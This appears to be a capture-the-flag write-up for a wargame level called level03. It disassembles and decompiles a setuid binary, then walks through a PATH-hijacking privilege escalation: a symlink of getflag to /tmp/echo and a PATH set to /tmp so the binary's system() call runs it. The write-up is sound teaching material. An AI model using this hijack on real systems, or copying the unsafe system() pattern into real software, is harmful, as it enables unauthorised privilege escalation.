# LEVEL 03

When we run the executable level03 in the machine (it doesn't accept any arguments)
it only outputs "exploit me".

We can use GDB to try to decompile the executable level03 by doing:

```
disassemble main
```

We then
We get the following output:
Dump of assembler code for function main:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     and    $0xfffffff0,%esp
   0x080484aa <+6>:     sub    $0x20,%esp
   0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
   0x080484b2 <+14>:    mov    %eax,0x18(%esp)
   0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
   0x080484bb <+23>:    mov    %eax,0x1c(%esp)
   0x080484bf <+27>:    mov    0x18(%esp),%eax
   0x080484c3 <+31>:    mov    %eax,0x8(%esp)
   0x080484c7 <+35>:    mov    0x18(%esp),%eax
   0x080484cb <+39>:    mov    %eax,0x4(%esp)
   0x080484cf <+43>:    mov    0x18(%esp),%eax
   0x080484d3 <+47>:    mov    %eax,(%esp)
   0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
   0x080484db <+55>:    mov    0x1c(%esp),%eax
   0x080484df <+59>:    mov    %eax,0x8(%esp)
   0x080484e3 <+63>:    mov    0x1c(%esp),%eax
   0x080484e7 <+67>:    mov    %eax,0x4(%esp)
   0x080484eb <+71>:    mov    0x1c(%esp),%eax
   0x080484ef <+75>:    mov    %eax,(%esp)
   0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
   0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
   0x080484fe <+90>:    call   0x80483b0 <system@plt>
   0x08048503 <+95>:    leave  
---Type <return> to continue, or q <return> to quit---
   0x08048504 <+96>:    ret

   We can try 

   https://dogbolt.org/

   int main(int argc,char **argv,char **envp){
    __gid_t __rgid;
    __uid_t __ruid;
    int iVar1;
    gid_t gid;
    uid_t uid;
    
    __rgid = getegid(); // returns the effective group ID of the calling process
    __ruid = geteuid(); // returns the effective user ID of the calling process.
    setresgid(__rgid,__rgid,__rgid); 
    setresuid(__ruid,__ruid,__ruid); // sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.
    iVar1 = system("/usr/bin/env echo Exploit me"); //calls the echo builtin located in usr/bin/env
    return iVar1;
}

> Env guessed where echo is based on the PATH env variable
> echo $PATH
> If we change the PATH env variable, we can control whats executed
> Switch the echo builtin with ./getflag that we need to execute
> easiest way to copy a file and change is to create a symbolic link  and then we change our environment variable PATH so that it has /tmp in it. :

ln -s /bin/getflag /tmp/echo
export PATH=/tmp
./level03
*getthetoken*
export PATH=/bin
